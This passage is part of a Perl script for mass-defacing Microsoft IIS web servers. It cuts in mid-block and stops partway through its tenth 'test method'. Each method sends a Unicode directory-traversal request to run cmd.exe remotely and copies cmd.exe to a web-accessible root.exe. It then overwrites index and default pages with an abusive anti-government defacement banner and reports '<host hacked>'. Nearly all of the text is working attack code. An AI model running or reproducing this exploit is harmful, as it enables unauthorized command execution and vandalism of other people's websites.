    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 6
my @results=sendraw("GET /scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%8s../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%8s../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 7
my @results=sendraw("GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 8
my @results=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/) 
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 9
my @results=sendraw("GET /scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c1%af..//winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1) 
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 10
my @results=sendraw("GET /scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/) 
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
